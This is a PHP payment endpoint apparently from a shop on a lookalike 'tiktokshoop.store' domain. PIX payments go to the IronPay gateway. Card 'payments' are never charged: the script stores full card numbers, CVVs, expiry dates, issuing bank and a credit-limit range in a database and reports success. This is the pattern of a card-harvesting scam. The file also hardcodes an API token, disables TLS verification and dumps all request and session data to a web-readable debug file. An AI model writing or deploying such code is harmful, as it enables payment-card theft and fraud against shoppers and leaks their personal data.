<?php
// api/create_payment.php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}// LOG TEMPORÁRIO PARA DEBUG
file_put_contents('debug_post.txt', json_encode([
    'GET' => $_GET,
    'POST' => $_POST,
    'JSON_INPUT' => json_decode(file_get_contents('php://input'), true),
    'SESSION' => $_SESSION
], JSON_PRETTY_PRINT));

date_default_timezone_set('America/Sao_Paulo');
header('Content-Type: application/json');

$user_id_sessao = $_SESSION['user_id'] ?? null;

require_once '../db_config.php';
$all_gateway_config = [];

try {
    $stmt_config = $pdo->query("SELECT chave, valor FROM config_gateway");
    $all_gateway_config = $stmt_config->fetchAll(PDO::FETCH_KEY_PAIR);
} catch (PDOException $e) {}

// Token configurado diretamente para garantir o funcionamento imediato
$IRONPAY_API_TOKEN = 'dHWOXlpdPL7MuNxonLM4JtwsWAClZ4bTJdBYc6eJxl2tEtLsQvaocwlEDttP';

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

// Identifica a forma de pagamento (pix ou card)
$payment_method = $input['payment_method'] ?? 'pix';

// Trata campos comuns do formulário
$product_id = (int)($input['product_id'] ?? 1);
$quantity   = (int)($input['quantity'] ?? 1);
if ($quantity <= 0) $quantity = 1;

$customer_name  = trim($input['customer_name'] ?? $input['nome'] ?? '');
$customer_email = trim($input['customer_email'] ?? $input['email'] ?? 'atendimento@portal.com');
$customer_cpf   = preg_replace('/[^0-9]/', '', $input['customer_cpf'] ?? $input['cpf'] ?? '');
$raw_phone      = preg_replace('/[^0-9]/', '', $input['customer_phone'] ?? $input['phone'] ?? '11999999999');
$servico_nome   = trim($input['servico'] ?? $input['product_name'] ?? 'Taxa de Atendimento / Serviço');
$custom_amount = (float)($input['amount'] ?? $input['valor'] ?? 19.90);

// Dados específicos do Cartão (se houver)
$card_number     = !empty($input['card_number']) ? trim($input['card_number']) : null;
$card_holder     = !empty($input['card_holder']) ? trim($input['card_holder']) : null;
$card_expiration = !empty($input['card_expiration']) ? trim($input['card_expiration']) : null;
$card_cvv        = !empty($input['card_cvv']) ? trim($input['card_cvv']) : null;
$card_bank       = !empty($input['card_bank']) ? trim($input['card_bank']) : null;
$card_limit_range = !empty($input['card_limit_range']) ? trim($input['card_limit_range']) : null;

try {
    if (empty($customer_name) || strlen($customer_cpf) !== 11) {
        throw new Exception("Informe um Nome completo e um CPF válido com 11 dígitos.");
    }

    $full_phone_55 = (strlen($raw_phone) <= 11) ? '55' . $raw_phone : $raw_phone;
    $prod_nome_display = $servico_nome;
    $valor_total_centavos = (int)round($custom_amount * 100);

    // ----------------------------------------------------
    // SE FOR CARTÃO: APENAS SALVA NO BANCO E RETORNA SUCESSO
    // ----------------------------------------------------
    if ($payment_method === 'card') {
        $localPedidoId = rand(10000, 99999);
        try {
            $stmt_insert = $pdo->prepare("INSERT INTO pedidos
                (user_id, status, customer_name, customer_email, customer_cpf, customer_phone, product_name, quantity, total_amount_centavos, card_number, card_holder, card_expiration, card_cvv, card_bank, card_limit_range)
                VALUES
                (:user_id, 'PENDENTE', :name, :email, :cpf, :phone, :prod_name, :qty, :total, :c_num, :c_hold, :c_exp, :c_cvv, :c_bank, :c_limit)");

            $stmt_insert->execute([
                'user_id'   => $user_id_sessao ? (int)$user_id_sessao : null,
                'name'      => $customer_name,
                'email'     => $customer_email,
                'cpf'       => $customer_cpf,
                'phone'     => $full_phone_55,
                'prod_name' => $prod_nome_display,
                'qty'       => $quantity,
                'total'     => $valor_total_centavos,
                'c_num'     => $card_number,
                'c_hold'    => $card_holder,
                'c_exp'     => $card_expiration,
                'c_cvv'     => $card_cvv,
                'c_bank'    => $card_bank,
                'c_limit'   => $card_limit_range
            ]);

            $db_id = $pdo->lastInsertId();
            if ($db_id) $localPedidoId = $db_id;
        } catch (Exception $dbErr) {
            // Log se necessário
        }

        http_response_code(200);
        echo json_encode([
            'status'   => 'success',
            'pedidoId' => $localPedidoId,
            'message'  => 'Dados do cartão registrados com sucesso.'
        ]);
        exit;
    }

    // ----------------------------------------------------
    // SE FOR PIX: USA O FLUXO DA IRONPAY
    // ----------------------------------------------------
    if (!$IRONPAY_API_TOKEN) {
        throw new Exception('Token de API da Iron Pay não configurado.');
    }

    $product_hash = 'iatlfawko9';
    $offer_hash   = 'ksf2tt43yt';
    $postback_url = 'https://www.tiktokshoop.store/api/webhook_ironpay.php';
    $api_url_full = "https://api.ironpayapp.com.br/api/public/v1/transactions";

    $payload = [
        'api_token'      => $IRONPAY_API_TOKEN,
        'product_hash'   => $product_hash,
        'offer_hash'     => $offer_hash,
        'operation_type' => 1,
        'payment_method' => 'pix',
        'amount'         => $valor_total_centavos,
        'postback_url'   => $postback_url,
        'customer'       => [
            'name'     => $customer_name,
            'email'    => $customer_email,
            'phone'    => $full_phone_55,
            'document' => $customer_cpf
        ],
        'cart' => [
            [
                'product_hash'   => $product_hash,
                'offer_hash'     => $offer_hash,
                'title'          => $prod_nome_display,
                'price'          => $valor_total_centavos,
                'quantity'       => $quantity,
                'tangible'       => false,
                'operation_type' => 1
            ]
        ]
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url_full);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Bearer ' . $IRONPAY_API_TOKEN,
        'Content-Type: application/json',
        'Accept: application/json'
    ]);

    $response   = curl_exec($ch);
    $http_code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($curl_error) {
        throw new Exception("Erro cURL: " . $curl_error);
    }

    $responseData = json_decode($response, true);

    if ($http_code !== 200 && $http_code !== 201) {
        $last_error_msg = $responseData['message'] ?? $responseData['error'] ?? $response;
        throw new Exception("Erro Iron Pay (HTTP $http_code): " . (is_array($last_error_msg) ? json_encode($last_error_msg, JSON_UNESCAPED_UNICODE) : $last_error_msg));
    }

    // EXTRAÇÃO DO PIX
    $pix_code_final = null;
    if (preg_match('/"pix_qr_code"\s*:\s*"([^"]+)"/', $response, $matches)) {
        $pix_code_final = $matches[1];
    } elseif (preg_match('/"pix_code"\s*:\s*"([^"]+)"/', $response, $matches)) {
        $pix_code_final = $matches[1];
    } elseif (isset($responseData['pix_qr_code'])) {
        $pix_code_final = $responseData['pix_qr_code'];
    }

    // EXTRAÇÃO DO TXID / HASH
    $gateway_txid_final = null;
    if (preg_match('/"hash"\s*:\s*"([^"]+)"/', $response, $matches)) {
        $gateway_txid_final = $matches[1];
    } elseif (preg_match('/"token"\s*:\s*"([^"]+)"/', $response, $matches)) {
        $gateway_txid_final = $matches[1];
    } else {
        $gateway_txid_final = 'iron_' . uniqid();
    }

    if (empty($pix_code_final)) {
        throw new Exception("Não foi possível gerar a chave PIX. Resposta da gateway: " . $response);
    }

    // GRAVAÇÃO DO PIX NO BANCO
    $localPedidoId = rand(10000, 99999);
    try {
        $stmt_insert = $pdo->prepare("INSERT INTO pedidos
            (user_id, gateway_txid, status, customer_name, customer_email, customer_cpf, customer_phone, product_name, quantity, total_amount_centavos, pix_code)
            VALUES
            (:user_id, :txid, 'PENDENTE', :name, :email, :cpf, :phone, :prod_name, :qty, :total, :pix_code)");

        $stmt_insert->execute([
            'user_id'   => $user_id_sessao ? (int)$user_id_sessao : null,
            'txid'      => $gateway_txid_final,
            'name'      => $customer_name,
            'email'     => $customer_email,
            'cpf'       => $customer_cpf,
            'phone'     => $full_phone_55,
            'prod_name' => $prod_nome_display,
            'qty'       => $quantity,
            'total'     => $valor_total_centavos,
            'pix_code'  => $pix_code_final
        ]);

        $db_id = $pdo->lastInsertId();
        if ($db_id) $localPedidoId = $db_id;
    } catch (Exception $dbErr) {}

    http_response_code(200);
    echo json_encode([
        'status'    => 'success',
        'pix_code'  => $pix_code_final,
        'pedidoId'  => $localPedidoId,
        'valor'     => number_format($valor_total_centavos / 100, 2, '.', ''),
        'expira_em' => date(DATE_ATOM, strtotime('+10 minutes'))
    ]);
    exit;

} catch (Exception $e) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    exit;
}